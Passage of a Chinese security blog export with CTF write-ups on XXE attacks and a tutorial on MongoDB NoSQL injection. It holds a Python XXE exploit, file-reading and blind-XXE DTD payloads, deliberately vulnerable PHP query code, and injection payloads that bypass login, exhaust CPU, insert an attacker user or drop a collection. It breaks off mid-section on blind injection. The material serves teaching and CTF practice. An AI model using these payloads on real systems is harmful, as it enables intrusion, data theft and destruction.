<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226122019.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135052.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135232.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135314.png" alt=""></p>
<h3 id="Fake-XML-Cookbook">Fake XML Cookbook</h3>
<p>题目地址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<p>题目说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;Difficulty: easy&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">flag is in &#x2F;flag</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;Author zjy&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php_xxe/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=payload,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
<h3 id="True-XML-cookbook">True XML cookbook</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226154009.png" alt=""></p>
<blockquote>
<p><a href="https://blog.csdn.net/winner0911/article/details/50600494">https://blog.csdn.net/winner0911/article/details/50600494</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153933.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153418.png" alt=""></p>
<h3 id="CSAWQual-2019-Web-Unagi">[CSAWQual 2019]Web_Unagi</h3>
<p>使用utf-16编码绕过WAF上传xml文件读取flag</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;utf-16&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">username</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>utf-16编码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104241.png" alt=""></p>
<p>上传</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104413.png" style="zoom:67%;" />
<h2 id="Update">Update</h2>
<p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
<p>无法引用外部DTD文件的前提下，无回显利用XXE注入：</p>
<h3 id="引用内部实体">引用内部实体</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#39;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
<h3 id="三层嵌套">三层嵌套</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message</span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p>xxe injector tool：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
<p>XXE payload list：<a href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></p>
<p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
<p><a href="https://p0rz9.github.io/2019/02/27/xxe/">XXE漏洞总结</a></p>
<p><a href="https://v0w.top/2019/01/20/XXE-note/#4-http%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">XXE学习笔记</a></p>
<p><a href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru">XXE实体注入</a></p>
<p><a href="http://gv7.me/articles/2018/think-about-blind-xxe-payload/">Blind XXE经典payload引发的脑洞</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>xxe漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL注入之MongoDB</title>
    <url>/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/</url>
    <content><![CDATA[<blockquote>
<p>文章首发于 信安之路 公众号</p>
</blockquote>
<h1 id="NoSQL注入之MongoDB">NoSQL注入之MongoDB</h1>
<h2 id="0x01-NoSQL和MongoDB">0x01 NoSQL和MongoDB</h2>
<h3 id="NoSQL">NoSQL</h3>
<p>NoSQL的概念就不赘述了，以下摘自菜鸟教程。</p>
<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
<h3 id="MongoDB">MongoDB</h3>
<p>详细概念建议直接看教程 <a href="http://www.runoob.com/mongodb/mongodb-tutorial.html">传送门🚪</a>，这里就简单的总结几句。</p>
<p>在MySQL中，我们所熟知的几个最常见的概念是数据库(Database)、表(Table)、字段(Column)、记录(Record)、索引(Index)，这些术语映射到MongoDB中大概等价于数据库(Database)、集合(Collection)、域(Field)、文档(Document)、索引(Index)。下面就通过官网文档的几张图略作解释。</p>
<p>文档是由一组键值(key-value)对(即 BSON，Binary JSON)组成。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，例如：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141435.png" alt=""></p>
<p>集合就是 MongoDB 文档组，集合存在于数据库中，集合没有固定的结构，这意味着你对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。下面这张图展示了这三者之间的关系：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141816.png" alt=""></p>
<p>好了，前置知识部分介绍到这里，下面开始今天的正文部分：MongoDB注入</p>
<h2 id="0x02-NoSQL注入">0x02 NoSQL注入</h2>
<p>讲MangoDB注入之前，我们先大致了解一下整个NoSQL注入的流程，下面这张图来自OWASP：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315112801.png" alt=""></p>
<p>NoSQL提供了新的数据模型和查询格式，从而可以规避常规的SQL注入攻。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法：</p>
<p><strong>重言式</strong></p>
<p>又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<p><strong>联合查询</strong></p>
<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<p><strong>JavaScript注入</strong></p>
<p>MongoDB Server支持JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。</p>
<p><strong>盲注</strong></p>
<p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和SQL注入中<code>substr()</code>函数相同的功能，而且NoSQL用到的基本上都是布尔盲注。</p>
<h2 id="0x03-PHP-MongoDB注入">0x03 PHP MongoDB注入</h2>
<p>在PHP中使用MongoDB你必须使用 MongoDB 的 <a href="https://pecl.php.net/package/mongodb">PHP驱动</a>，官网上可以看到有很多版本，其中1.0.0版本之后，php_mongodb.dll将不再支持<code>MongoClient</code>类，也就是说，<code>$m = new MongoClient(&quot;mongodb://localhost:27017&quot;);</code>这种调用方式已经被淘汰，而是用命名空间的方式，但是注入的手法和原理是差不多的，这里就主要介绍一下新版PHP驱动进行查询操作MongoDB的三种方法（一般注入也是发生在查询语句中），为了方便，均以GET请求方式为例。</p>
<p>测试环境</p>
<ul>
<li>win10</li>
<li>PHP 7.3.4</li>
<li>MongoDB Server 4.2</li>
<li>php_mongodb.dll 1.7.4</li>
</ul>
<h3 id="重言式注入">重言式注入</h3>
<p>利用<code>executeQuery</code>直接查询：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://localhost:27017&quot;</span>);</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span> =&gt; $uname,</span><br><span class="line">    <span class="string">&#x27;pwd&#x27;</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . $user[<span class="string">&#x27;uname&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . $user[<span class="string">&#x27;pwd&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传递的参数是一个数组，比较安全。这种形式叫 <code>ODM</code>，它会帮你过滤数据，所以一般不用担心原语句被破坏。</p>
<blockquote>
<p><code>ORM</code> 对应关系型数据库，如 MySQL；<code>ODM</code> 对应文档型数据库，如 MongoDB。</p>
</blockquote>
<p>当我们用公共用户ca01h输入时，显示出username和password：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315145255.png" alt=""></p>
<p>这是一个正常的输入，数据处理过程如下图所示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315155248.png" alt=""></p>
<p>PHP允许最终用户通过将URL参数更改为带有方括号的参数来将GET查询字符串输入更改为数组，我们试一下这种输入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315153912.png" alt=""></p>
<blockquote>
<p>$ne即not equal不等于</p>
</blockquote>
<p>amazing~所有用户都查出来了，再看一下数据处理过程：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315154547.png" alt=""></p>
<p>对于PHP本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个value的值为1的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为payload进行攻击。</p>
<p>这种方式也是我们通常用来验证网站是否存在NoSQL注入的第一步。</p>
<h3 id="联合查询注入">联合查询注入</h3>
<p>我们都知道在SQL时代拼接字符串容易造成SQL注入，NoSQL也有类似问题，但是现在无论是PHP的MongoDB driver还是node.js的mongoose都必须要求查询条件必须是一个数组或者query对象了，因此简单看一下就好。</p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> query =<span class="string">&quot;&#123; username: &#x27;&quot;</span> + $username + <span class="string">&quot;&#x27;, password: &#x27;&quot;</span> + $password + <span class="string">&quot;&#x27; &#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password&#x3D;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
<p>相当于执行了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
<p>这种手法和SQL注入比较相似：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;))</span><br></pre></td></tr></table></figure>
<h3 id="JavaScript注入">JavaScript注入</h3>
<h4 id="where操作符">$where操作符</h4>
<p>在MongoDB中 $where操作符是可以执行JavaScript语句的，在MongoDB 2.4之前，通过$where操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到mongo shell中的全局函数和属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$function = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;$where&#x27;</span> =&gt; $function</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MongoDB 2.4版本之前，可以访问到db属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;&#39;||1) return &#123;&#39;username&#39;: tojson(db.getCollectionNames()), &#39;password&#39;: &#39;hacked&#39;&#125;&#125;&#x2F;&#x2F;&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
<p>由此可以扩展出其他的很多类似的payload。</p>
<p>MongoDB 2.4版本之后，无法访问全局属性，NoSQL中的万能密码payload(单引号闭合)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;admin&#39; || &#39;&#39; &#x3D; &#39;</span><br></pre></td></tr></table></figure>
<p>相当于执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$function &#x3D; &quot;function() &#123;if(this.uname &#x3D;&#x3D; &#39;anything&#39; &amp;&amp; this.pwd &#x3D;&#x3D; &#39;admin&#39; || &#39;&#39; &#x3D;&#x3D; &#39;&#39;) return &#123;&#39;username&#39;: this.uname, &#39;password&#39;: this.pwd&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
<p>此外还有一个类似于DOS攻击的payload，可以让服务器CPU飙升到100%持续5秒：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;1;(function()&#123;var date &#x3D; new Date(); do&#123;curDate &#x3D; new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
<h4 id="eval">eval</h4>
<p>注意，<code>eval</code>使用方式在Mongo3.0之后已经被废弃了，而且在官方页面中也没有Mongo3.0版本之前的下载链接了，以下的实例代码未经测试，仅提供给大家一个思路，以下代码引用自https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$cmd = <span class="keyword">new</span> MongoDB\Driver\Command([</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;</span>.$uname<span class="string">&#x27;&#125;)&quot;</span></span><br><span class="line"><span class="string">]);</span></span><br><span class="line"><span class="string">echo &quot;db.users.distinct(&#x27;</span>uname<span class="string">&#x27;, &#123;uname: &#x27;</span><span class="string">&quot;.<span class="subst">$uname</span>&#x27;&#125;)&quot;</span>;</span><br><span class="line">$result = $manager-&gt;executeCommand(<span class="string">&#x27;sec_test&#x27;</span>, $cmd)-&gt;toArray();</span><br><span class="line">$result =((<span class="keyword">array</span>)$result[<span class="number">0</span>])[<span class="string">&#x27;retval&#x27;</span>];</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>往users集合插入攻击者用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
<p>删掉users集合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
<h4 id="mapReduce">mapReduce</h4>
<p>MongoDB中的<code>mapReduce</code>函数有点类似于MySQL中的<code>group by</code>操作，下面是一个官方文档的例子，在集合 orders 中查找 status:“A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316201954.png" alt=""></p>
<p>简单的解释一下：</p>
<p><code>map</code>函数用于分组：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span>&#123; emit(param1, param2); &#125;</span><br></pre></td></tr></table></figure>
<p>param1：需要分组的字段，this.字段名；</p>
<p>param2：需要进行统计的字段，this.字段名。</p>
<p><code>reduce</code>函数用于处理需要统计的字段：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params">key, values</span>)</span>&#123; <span class="comment">// 统计字段处理 &#125;</span></span><br></pre></td></tr></table></figure>
<p>key： 指分组字段（emit的param1）对应的值；</p>
<p>values：指需要统计的字段（emit的param2）值组成的数组。</p>
<p>Map函数和Reduce函数可以使用 JavaScript 来实现，使得MapReduce的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> <span class="string">&quot;/vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$param = $_POST[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line">$collection = (<span class="keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;</span><br><span class="line">$map = <span class="string">&quot;function() &#123;</span></span><br><span class="line"><span class="string">		    for (var i = 0; i &lt; this.items.length; i++) &#123;</span></span><br><span class="line"><span class="string">		 	emit(this.name, this.items[i].<span class="subst">$param</span>);    &#125; </span></span><br><span class="line"><span class="string">		    &#125;&quot;</span>;</span><br><span class="line">$reduce = <span class="string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;</span><br><span class="line">$opt = <span class="string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$results = $collection-&gt;mapReduce($map, $reduce, $out);</span><br></pre></td></tr></table></figure>
<p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: ‘x’ &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1</span><br></pre></td></tr></table></figure>
<p>那么在MongoDB中就相当于执行了下面这条语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.stores.mapReduce(function() &#123; </span><br><span class="line">for (var i&#x3D;0; i &lt; this.items.length; i++) &#123;</span><br><span class="line">emit(this.name, this.items[i].a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">function(kv) &#123; return 1; &#125;, &#123; out: &#39;x&#39; &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;,</span><br><span class="line">function(name, sum) &#123;</span><br><span class="line">return Array.sum(sum); &#125;, &#123; out: &#39;totals&#39; &#125;);&quot;</span><br></pre></td></tr></table></figure>
<p>相当于直接控制了整个MongoDB的操作。</p>
<p>但我们也同时发现，构建这样的payload是有一定难度的，需要我们对MongoDB，JavaScript和业务都有足够的了解，这也是NoSQL注入的局限性。但是，这个例子也告诉我们有用户输入的地方就有危险存在，比如后面有一个CTF题，用的也是MongoDB中的聚合函数<code>aggregate</code>，但是因为一个GET参数而存在注入漏洞。</p>
<h3 id="盲注">盲注</h3>
<p>回想一想上面的例子，假如页面只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用<code>substr</code>，而在 MongoDB 里我们有 <code>$regex</code>。</p>
<p>已知某一个用户名的前提下判断的密码长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;.&#123;5&#125;</span><br></pre></td></tr></table></figure>
<p>逐位提取字符：</p>
